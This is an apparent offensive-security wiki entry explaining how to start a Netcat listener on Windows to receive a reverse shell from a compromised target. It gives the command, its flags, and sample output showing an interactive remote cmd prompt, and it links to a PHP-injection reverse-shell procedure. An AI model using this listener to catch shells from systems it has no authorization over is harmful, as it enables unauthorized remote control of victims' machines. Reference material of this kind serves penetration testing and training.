---
type: command
executor: bash
data: nc.exe -lvp 9999
output: null
created_at: '2020-07-27T17:11:46.385430+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Windows
tags:
  - reverse-shell
  - listener
verified: true
validated: true
---

# nc-windows-listener-for-reverse-shell

## Command

```bash
nc.exe -lvp 9999
```

## Description

This command starts Netcat in listening mode on port 9999, waiting for an incoming reverse shell connection from a compromised target. It is used on Windows systems to receive command-line access via TCP. The `-l` flag enables listening, `-v` provides verbose output, and `-p` specifies the port.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-l` | Listen mode for incoming connections | Yes |
| `-v` | Verbose output to show connection details | Yes |
| `-p 9999` | Port to listen on (use a non-privileged port >1024) | Yes |
| `nc.exe` | Windows executable for Netcat (ensure it's in PATH or full path) | Yes |

## Examples

### Basic Usage

```bash
nc.exe -lvp 9999
```

### Advanced Usage

```bash
nc.exe -lvp 9999 -s 0.0.0.0
```
(Add `-s` to bind to all interfaces explicitly.)

## Expected Output

When successful, the command outputs:

```
listening on [any] 9999 ...
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from [target IP].
Ncat: Connection from [target IP]:[ephemeral port].
Microsoft Windows [Version 10.0.17763.1339]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\\Users\\[user]> 
```
This indicates a successful connection and drops into an interactive shell prompt.

## Related

- [[procedures/Establish-Reverse-Shell-via-PHP-Code-Injection]]
- [[tools/Netcat]]
